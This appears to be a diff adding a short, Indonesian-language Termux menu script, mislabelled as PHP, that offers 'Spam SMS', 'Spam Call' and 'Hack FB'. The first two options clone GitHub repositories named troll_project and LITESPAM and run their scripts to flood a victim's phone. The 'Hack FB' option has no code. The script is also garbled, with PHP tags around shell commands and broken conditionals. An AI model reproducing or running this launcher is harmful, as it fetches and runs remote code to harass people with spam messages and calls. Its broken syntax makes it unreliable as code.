@@ -1,0 +1,39 @@
+<?php
+clear
+figlet Mr. FL45H SHADOW | lolcat
+echo "=============================
+
+# Nama : Mr. FL45H SHADOW
+# No Hp : 0888×××××××
+
+=============================" | lolcat
+
+sleep [2]
+echo " [1] Spam SMS
+[2] Spam Call
+[3] Hack FB
+[4] Exit " | lolcat
+echo " [*] Pilih nomer : " | lolcat
+
+if ( $nomor = 1 ) | | ( $nomor = 01) 
+then
+clear
+Pkg install git 
+pkg install curl
+git clone https://github.com/zlucifer/troll_project
+cd troll_project
+chmod +x *
+termux-fix-shebang troll.sh
+./troll.sh
+fi
+
+if ( $nomor = 2) | | ( $nomor = 02)
+then
+clear
+pkg install git
+git clone https://github.com/4L13199/LITESPAM
+cd LITESPAM
+sh LITESPAM.sh atau  
+bash LITESPAM.sh
+fi
+>
